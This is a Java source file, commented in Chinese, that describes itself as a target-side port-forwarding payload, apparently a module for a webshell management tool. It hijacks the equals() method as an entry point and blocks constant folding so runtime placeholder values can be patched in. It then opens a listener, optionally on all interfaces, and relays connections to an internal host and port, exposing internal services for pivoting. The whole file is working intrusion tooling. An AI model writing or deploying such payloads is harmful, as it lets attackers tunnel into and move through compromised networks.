// 目标侧端口转发载荷：监听 l → 双向中继到 h:t（本地/内网端口暴露）。
// 一次性启动后台线程；绑定面 a（空=loopback，*=任意）。
// 约束：默认包、全反射回显、单 class、零跨类引用（relay/pump 内联）。
public class WsmFwd {

	public static final String l = "WSMF-L0"; // 监听端口
	public static final String h = "WSMF-H0"; // 目标主机
	public static final String t = "WSMF-T0"; // 目标端口
	public static final String a = "WSMF-A0"; // 绑定面：空=loopback，*=0.0.0.0

	public boolean equals(Object ctx) {
		String out;
		try {
			final int listen = Integer.parseInt(String.valueOf(l)); // valueOf 屏障防常量折叠
			final String host = String.valueOf(h);
			final int dst = Integer.parseInt(String.valueOf(t));
			boolean any = "*".equals(a);
			final java.net.ServerSocket ss = new java.net.ServerSocket(listen, 16,
				any ? null : java.net.InetAddress.getLoopbackAddress());
			Thread t2 = new Thread(() -> {
				while (true) {
					try {
						java.net.Socket c = ss.accept();
						new Thread(() -> {
							try {
								java.net.Socket d = new java.net.Socket();
								d.connect(new java.net.InetSocketAddress(host, dst), 8000);
								relay(c, d);
							} catch (Throwable ignored) {
								try { c.close(); } catch (Throwable ignored2) {}
							}
						}).start();
					} catch (Throwable ignored) { return; }
				}
			});
			t2.setDaemon(true);
			t2.start();
			out = "OK forward " + (any ? "0.0.0.0" : "127.0.0.1") + ":" + listen + " -> " + host + ":" + dst;
		} catch (Throwable e) { out = "!ERR " + e; }
		try { write(respOf(ctx), out); } catch (Throwable ignored) {}
		return true;
	}

	static void relay(java.net.Socket a, java.net.Socket b) {
		Thread t1 = pump(a, b);
		Thread t2 = pump(b, a);
		try { t1.join(); } catch (Throwable ignored) {}
		try { t2.join(); } catch (Throwable ignored) {}
		try { a.close(); } catch (Throwable ignored) {}
		try { b.close(); } catch (Throwable ignored) {}
	}

	static Thread pump(java.net.Socket from, java.net.Socket to) {
		Thread t = new Thread(() -> {
			try {
				java.io.InputStream in = from.getInputStream();
				java.io.OutputStream out = to.getOutputStream();
				byte[] buf = new byte[16384];
				int n;
				while ((n = in.read(buf)) != -1) { out.write(buf, 0, n); out.flush(); }
			} catch (Throwable ignored) {}
			try { to.close(); } catch (Throwable ignored) {}
		});
		t.setDaemon(true);
		t.start();
		return t;
	}

	static Object respOf(Object ctx) {
		if (ctx == null) return null;
		if (ctx instanceof Object[]) { Object[] a = (Object[]) ctx; return a.length > 1 ? a[1] : null; }
		try { return ctx.getClass().getMethod("getResponse").invoke(ctx); } catch (Throwable ignored) {}
		return null;
	}

	static void write(Object resp, String s) throws Exception {
		try {
			resp.getClass().getMethod("setContentType", String.class).invoke(resp, "text/plain;charset=UTF-8");
		} catch (Throwable ignored) {}
		Object w = resp.getClass().getMethod("getWriter").invoke(resp);
		w.getClass().getMethod("write", String.class).invoke(w, s);
	}
}
